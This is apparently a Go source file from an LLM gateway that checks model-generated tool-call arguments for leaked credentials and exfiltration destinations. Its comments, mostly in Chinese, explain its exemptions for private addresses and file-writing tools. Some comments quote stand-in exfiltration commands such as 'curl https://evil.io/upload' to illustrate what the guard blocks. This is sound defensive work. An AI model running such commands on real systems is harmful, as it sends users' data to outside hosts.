package sanitize

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net"
	"strings"

	compliancehook "github.com/kaixuan/llm-gateway-go/domains/hooks/outputcompliance"
	"github.com/kaixuan/llm-gateway-go/domains/outputcompliance"
)

type OutputSensitiveAction string

const (
	OutputMask  OutputSensitiveAction = "mask"
	OutputBlock OutputSensitiveAction = "block"
)

// NewOutputSensitiveInterceptor must run before restoration. Model-generated
// sensitive values have no trusted provenance and are never inserted into the
// reversible input map. Unknown actions conservatively select masking.
func NewOutputSensitiveInterceptor(s *Sanitizer, action OutputSensitiveAction) *compliancehook.OutputComplianceInterceptor {
	return compliancehook.NewMandatoryOutputComplianceInterceptor(&outputSensitiveChecker{sanitizer: s, action: action}, "sanitize.output.pending")
}

// detectEgress runs the detector in ScopeEgress, which is the only scope that
// still matches address rules.
//
// This is the whole point of the split: input sanitization and plain output
// redaction both run under ScopeRedact (addresses are operational text, not
// secrets), while this guard needs the address rules because a routable address
// in a model-authored tool argument is an exfiltration *destination*. Widening
// the redaction scope therefore cannot quietly widen the egress surface.
func (c *outputSensitiveChecker) detectEgress(ctx context.Context, text string) ([]SensitiveFragment, error) {
	if c == nil || c.sanitizer == nil {
		return nil, ErrNilSanitizer
	}
	detector := c.sanitizer.detector
	if scoped, ok := detector.(interface {
		DetectScope(context.Context, string, DetectionScope) ([]SensitiveFragment, error)
	}); ok {
		return scoped.DetectScope(ctx, text, ScopeEgress)
	}
	// A pluggable Detector without scope support gets the default Detect; it
	// simply has no address rules to contribute here.
	return detector.Detect(ctx, text)
}

// toolJSONLabelPrefix 是 tool JSON 参数字段的标签前缀。携带工具名时形如
// `__tool_json@Write`（协议提取现场把 function.name 拼进标签，r1020）。
const toolJSONLabelPrefix = "__tool_json"

// toolJSONLabel 返回带工具名的 tool JSON 标签；name 为空时退回裸标签。
func toolJSONLabel(name string) string {
	if name == "" {
		return toolJSONLabelPrefix
	}
	return toolJSONLabelPrefix + "@" + name
}

// parseToolJSONLabel 识别 `__tool_json` / `__tool_json@<name>` 两种标签，
// 返回携带的工具名（无名为空串）。非 tool JSON 标签返回 ok=false。
func parseToolJSONLabel(label string) (toolName string, ok bool) {
	if label == toolJSONLabelPrefix {
		return "", true
	}
	rest, found := strings.CutPrefix(label, toolJSONLabelPrefix+"@")
	if !found {
		return "", false
	}
	return rest, true
}

// inertContentTools 是**参数本身不触网**的工具名封闭集（比较前小写化）。
//
// 2026-10-13（r1020，minimax-m3 生产事故成因）：防外传守卫此前对 tool 参数里的
// 每个字符串一视同仁地做目的地检查，而 coding agent 的 tool 参数主体是 Write/Edit
// 写入的**文件内容**——源码里引用公网 URL（`'https://acc.kxpms.cn'`）、
// `file.ts:135` 行号引用都是日常形态，与 `curl https://evil.io/upload` 在字符串
// 层面不可区分。结果：模型每写一个含 URL 的文件，整条响应 output_policy_blocked，
// 客户端零内容（ZCode 报「模型未返回任何数据」）。
//
// 为什么按工具名豁免是对的，而不是又一次形态枚举：
//
//   - 外传的成立条件是「客户端会把这些参数**发给网络**」，不是「参数里出现了
//     目的地」。文件写入工具的参数是惰性数据——写进本地文件的 URL 不产生任何
//     网络行为，与 assistant 纯文本里出现 URL（守卫本就放行、只走脱敏）完全
//     同级。按载体能力分流，方向与 isNonExfiltrationFragment（按可达性分流）
//     一致。
//   - 工具名是**客户端声明的动词语义**，由客户端（凭证与数据的持有方，网关
//     信任边界内）注册，模型只能调用、不能发明。把 `Write` 名下的参数当惰性
//     数据，信任的是客户端的工具实现，不是模型的输出。
//   - 封闭集 + 默认不豁免：未收录的工具名（含 MCP 名字空间、未知客户端）一律
//     走原有 fail-closed 检查。新客户端出现误伤时往集合里加一行，判据
//     （r1020 判据文件的 Bash 同内容拦截用例）保证加名不会顺带放开命令类工具。
//
// 注意：豁免只作用于**外传目的地检查**（egress 片段 + hasPublicHostDestination）。
// credentialField 的凭据键检查对惰性工具照常生效——文件里写 `password: 明文`
// 依旧整条阻断，与工具无关。
var inertContentTools = map[string]bool{
	// ZCode / Claude Code 家族
	"write": true, "edit": true, "multiedit": true, "notebookedit": true,
	"read": true, "grep": true, "glob": true, "ls": true,
	"todowrite": true, "todoread": true,
	// Cursor 家族
	"create_file": true, "edit_file": true, "read_file": true, "view_file": true,
	"str_replace_based_edit": true, "codebase_search": true,
	// Cline / 通用 patch 家族
	"write_to_file": true, "replace_in_file": true,
	"apply_patch": true, "apply_patch_file": true, "str_replace_editor": true,
	"insert_content": true,
}

// isInertContentTool 报告 name 是否为惰性内容工具（参数不触网）。
func isInertContentTool(name string) bool {
	return inertContentTools[strings.ToLower(strings.TrimSpace(name))]
}

type outputSensitiveChecker struct {
	sanitizer *Sanitizer
	action    OutputSensitiveAction
}

func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, text string) (*outputcompliance.ComplianceResult, error) {
	if c.sanitizer == nil {
		return nil, ErrNilSanitizer
	}
	if label == "__tool_fragment" {
		// Full JSON is checked at terminal/EOF; fragments may contain opaque data
		// or split escapes that cannot be interpreted independently.
		return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: text}, nil
	}
	_, isMarker := ParsePlaceholder(text)
	if toolName, isToolJSON := parseToolJSONLabel(label); isToolJSON {
		if !json.Valid([]byte(text)) {
			return &outputcompliance.ComplianceResult{Blocked: true}, nil
		}
		decoder := json.NewDecoder(bytes.NewReader([]byte(text)))
		decoder.UseNumber()
		var value any
		if err := decoder.Decode(&value); err != nil {
			return nil, err
		}
		unsafe, err := c.unsafeToolValue(ctx, value, "", 0, toolName)
		if err != nil {
			return nil, err
		}
		if unsafe {
			return &outputcompliance.ComplianceResult{Blocked: true}, nil
		}
		return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: text}, nil
	}
	// r1024：只有密码族字段触发凭据硬阻断。身份族（username/account 等）
	// 的值是登录身份不是机密，且裸用户名永远不可能以占位符形态出现，
	// 按 credentialField 一律阻断等于结构性掐断一切带用户名的工具调用。
	// r1024b：模型自造的占位拼写同理放行（见 placeholderCredentialValues）。
	if label != "" && secretCredentialField(label) && text != "" && !isMarker && !isPlaceholderCredentialValue(label, text) {
		marker := RedactionMarker(TypeSecret)
		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: marker, Issues: []outputcompliance.ComplianceIssue{{Type: "sensitive", Subtype: "credential", Content: marker, Severity: 8}}}, nil
	}
	return c.Check(ctx, tenant, text)
}

// unsafeToolValue 深度遍历 tool 参数值，判定是否「不安全」。
//
// toolName（可空）是本次调用的工具名，来自协议提取现场的 function.name
// （r1020）。惰性内容工具（isInertContentTool）的参数不触网，跳过外传目的地
// 检查——但密码族凭据键检查（secretCredentialField）对任何工具都保留：写文件
// 写出的明文凭据与触网无关，属另一条底线。身份族字段（r1024）不在此列。
func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any, label string, depth int, toolName string) (bool, error) {
	if depth > maxNativeToolInputDepth {
		return false, errors.New("output tool input depth exceeded")
	}
	switch value := value.(type) {
	case string:
		// r1024b：模型自造的占位拼写（"PLACEHOLDER"/"TODO"/"<...>"）不是
		// 泄漏的真值，不触发密码族明文阻断——否则并行工具调用里一个早产
		// 的占位值会把同轮全部合法调用一并掐断。
		if _, marker := ParsePlaceholder(value); secretCredentialField(label) && value != "" && !marker && !isPlaceholderCredentialValue(label, value) {
			return true, nil
		}
		document := bytes.TrimSpace([]byte(value))
		if len(document) > 0 && (document[0] == '{' || document[0] == '[') && json.Valid(document) {
			decoder := json.NewDecoder(bytes.NewReader(document))
			decoder.UseNumber()
			var embedded any
			if err := decoder.Decode(&embedded); err != nil {
				return false, err
			}
			return c.unsafeToolValue(ctx, embedded, label, depth+1, toolName)
		}
		if isInertContentTool(toolName) {
			// 惰性内容载体（Write/Edit 写文件等）：参数是被写的数据，不是被
			// 执行的命令。其中的 URL/地址是文本引用，不构成外传目的地——
			// 与 assistant 纯文本出现 URL 时的处理（脱敏路径、不阻断）对齐。
			return false, nil
		}
		fragments, err := c.detectEgress(ctx, value)
		if err != nil {
			return false, err
		}
		for _, fragment := range fragments {
			// r1032d（2026-10-15）：account（用户名形状）片段不是外传目的地，
			// 不参与 tool 参数的 unsafe 判定。detectEgress 的 ScopeEgress 不过
			// 滤规则类型，r1024 拓宽后的 YAML account 规则会命中普通 shell
			// 命令里的 `USER=$USER` / `USER=$(whoami)`（label 集含
			// user(?:name|_name)? 与 *_user），而用户名 token 既不可路由也不在
			// isNonExfiltrationFragment 的豁免表里 → 整条 tool lane 以零 issues
			// 阻断（grok-4.6 chat 腿第 2+ 轮实测：上游参数完整、客户端只收到
			// 工具名）。与 r1024 的身份/密码族拆分同一条原理：身份不是机密。
			// 其余非地址片段（email/secret 等）保持原有阻断契约
			// （r1017 公网 user@host / r1028 真实凭据样值）。
			if fragment.Type == TypeAccount {
				continue
			}
			if isNonExfiltrationFragment(fragment) {
				// 2026-10-08 minimax-m3/glm-5.3 fail-closed incident: the
				// server_ip pattern matches any IPv4, and dev tooling echoes
				// 127.0.0.1 / RFC1918 targets in model-generated commands
				// constantly. These originate from the data owner's own session
				// context and cannot be exfiltration destinations; blocking the
				// whole stream on them (regardless of the configured OutputMask
				// action) made tool-driving models unusable. Public addresses
				// keep the hard block
				// (TestGeneratedSensitiveToolOperationsAreBlocked contract).
				continue
			}
			return true, nil
		}
		// 2026-10-11：ScopeEgress 只匹配 IP 字面量规则，域名形式的外传目的地
		// （curl http://evil.example.com/collect）一律畅通。判定与 IP 侧同一条
		// 底线：默认公网可达即阻断，只豁免明确不可路由的主机。见 egress_host.go。
		// 放在片段循环之后：两套规则互相独立，私网 IP 的豁免不会被这里撤销。
		if hasPublicHostDestination(value) {
			return true, nil
		}
		return false, nil
	case map[string]any:
		// r1024：身份族与密码族都保持「非字符串形状 fail-closed」（畸形形状是
		// 绕过手法，与值是否机密无关）；只有字符串明文按族分流（见上）。
		if credentialField(label) {
			return true, nil
		}
		for key, child := range value {
			if compliancehook.IsOpaqueToolValue(key, child) {
				continue
			}
			unsafe, err := c.unsafeToolValue(ctx, child, key, depth+1, toolName)
			if unsafe || err != nil {
				return unsafe, err
			}
		}
	case json.Number, bool:
		return credentialField(label), nil
	case []any:
		for _, child := range value {
			unsafe, err := c.unsafeToolValue(ctx, child, label, depth+1, toolName)
			if unsafe || err != nil {
				return unsafe, err
			}
		}
	}
	return false, nil
}

// isNonRoutableAddressFragment reports whether a detected address fragment is
// a target that cannot carry exfiltration. 实际判定委派给
// isNonExfiltrationAddress，故覆盖范围以那里为准（loopback / private /
// link-local / unspecified / CGNAT / multicast），不要在本文件里重复枚举网段。
//
// 2026-10-11（245 build_seq 2531 部署后端到端实测）：类型集合里**必须**包含
// TypeInternalIP，否则 r1008 的私网豁免形同虚设。
//
// 成因是一步类型重写：DetectScope 命中 server_ip 后发现
// `address.IsPrivate()`，就把片段重写成 TypeInternalIP（detector.go）。而本函数
// 原来只对 server_ip / server_ipv6 做豁免判定，于是 internal_ip 落到 default
// 分支返回 false —— **恰好是私网地址被改成了唯一不被豁免的那个类型**，r1008
// 加固被自己的重写作废。生产用的是 YAML 检测器（带 server_ip 规则），于是模型
// 生成的 tool 参数里只要有私网地址就整条响应 `output_policy_blocked`，用户无法
// 执行任何指向自己内网的命令。
//
// 既有的 TestEgressGuardStillIgnoresPrivateAddresses 用内置 fallback 检测器，
// 而 fallback 里根本没有地址规则，所以那条判据恒真、盖不住这个洞。
func isNonRoutableAddressFragment(fragment SensitiveFragment) bool {
	switch fragment.Type {
	case TypeServerIP, TypeInternalIP, typeServerIPv6:
	default:
		return false
	}
	return isNonExfiltrationAddress(fragment.Value)
}

// isNonExfiltrationEmailFragment 判断一个邮箱形状的片段在 egress 语境下是不是
// 「明确不可路由的目的地」。
//
// 2026-10-11 生产探针实测的误阻断：email 规则把任何 user@host.tld 当成敏感值，
// 而 egress 侧对非地址类片段一律硬阻断，于是内网的 SSH/SCP 目标被整条响应
// `output_policy_blocked`：
//
//	ssh ops@10.24.7.91 uptime                        → 放行
//	ssh deploy@build.corp.internal systemctl status → **阻断**
//	scp file.txt user@fileserver.corp.internal:/tmp/ → **阻断**
//	ssh deploy@build-server.local                   → **阻断**
//	mail ops@kaixuan.com                            → 阻断（这条是对的）
//
// 注意前三行与第一行的矛盾：**同一个操作，写 IP 放行、写内网域名阻断**。判定
// 取决于写法而不是可达性——这与 dc63f19ff 修的「私网地址恰好被重写成唯一不被
// 豁免的类型」是同一类错误的镜像。
//
// 修法不是「放过邮箱」（那会让 mail/收件人形态真的外传无人管），而是把邮箱的
// **主机部分**交回主机可达性判定：内部主机放行，公网主机仍然阻断。于是
// user@attacker.io、mail ops@kaixuan.com 的阻断原样保留。
func isNonExfiltrationEmailFragment(fragment SensitiveFragment) bool {
	if fragment.Type != TypeEmail {
		return false
	}
	at := strings.LastIndex(fragment.Value, "@")
	if at < 0 || at == len(fragment.Value)-1 {
		return false
	}
	return isNonExfiltrationHost(fragment.Value[at+1:])
}

// isNonExfiltrationFragment 是守卫唯一的豁免入口：片段能否承载外传。
//
// 分派理由与形状无关——只问「这个目的地可不可路由」。地址问地址，主机问主机，
// 邮箱形状的主机部分问主机。新增片段类型时在这里补一条即可，不要在调用点分支。
func isNonExfiltrationFragment(fragment SensitiveFragment) bool {
	if isNonRoutableAddressFragment(fragment) {
		return true
	}
	return isNonExfiltrationEmailFragment(fragment)
}

// isNonExfiltrationAddress 回答「这个地址能不能是外传目的地」。
//
// 2026-10-11 批判性审计（承接 dc63f19ff）：原来的写法是枚举豁免谓词
// （loopback / private / linklocal / unspecified），这个方向本身就是错的——
// 它把「没列举到的」默认成外传，于是每出现一个新网段就复发一次同类故障。
// 已实测复发过一次：CGNAT 100.64.0.0/10（Tailscale / WireGuard 常用）与
// 云元数据 100.100.100.100（阿里云）都会让指向自己内网或 mesh 的 tool 调用
// 整条 output_policy_blocked，与 dc63f19ff 修的私网阻断是同一个用户症状。
//
// 改为反过来问：默认按公网可达处理（fail-closed 保住），只对**明确不可路由**
// 的地址放行。新增的两类都来自实测：
//
//   - CGNAT 100.64.0.0/10（RFC 6598）：net.IP.IsPrivate() 不认它，但它是共享
//     地址空间，恰恰是 overlay 网络的地址段。
//   - 组播 224.0.0.0/4：不是单播目的地，不可能承载外传。
//
// 云元数据 169.254.169.254 走 IsLinkLocalUnicast 已被覆盖，这里只补注释说明
// 它是被显式意图覆盖的，不是侥幸命中。
func isNonExfiltrationAddress(value string) bool {
	ip := net.ParseIP(strings.TrimSpace(value))
	if ip == nil {
		return false
	}
	if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
		return true
	}
	if ip.IsMulticast() {
		return true
	}
	// RFC 6598 shared address space (CGNAT)：net 的 IsPrivate 不覆盖，但 Tailscale
	// / WireGuard / 运营商级 NAT 都在这里，是典型的不该被当成外传目的地的地址。
	if v4 := ip.To4(); v4 != nil && v4[0] == 100 && v4[1] >= 64 && v4[1] <= 127 {
		return true
	}
	return false
}

func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text string) (*outputcompliance.ComplianceResult, error) {
	if c.sanitizer == nil {
		return nil, ErrNilSanitizer
	}
	fragments, err := c.sanitizer.detector.Detect(ctx, text)
	if err != nil {
		return nil, err
	}
	spans := mergeFragmentSpans(fragments, len(text))
	result := &outputcompliance.ComplianceResult{Compliant: len(spans) == 0, RedactedOutput: text}
	if len(spans) == 0 {
		return result, nil
	}
	var safe strings.Builder
	last := 0
	for _, span := range spans {
		safe.WriteString(text[last:span.start])
		safe.WriteString(RedactionMarker(span.typ))
		last = span.end
		result.Issues = append(result.Issues, outputcompliance.ComplianceIssue{
			Type: "sensitive", Subtype: string(span.typ), Content: RedactionMarker(span.typ), Severity: 8, Score: 1, Redacted: c.action != OutputBlock,
		})
	}
	safe.WriteString(text[last:])
	result.RedactedOutput = safe.String()
	result.Blocked = c.action == OutputBlock
	return result, nil
}
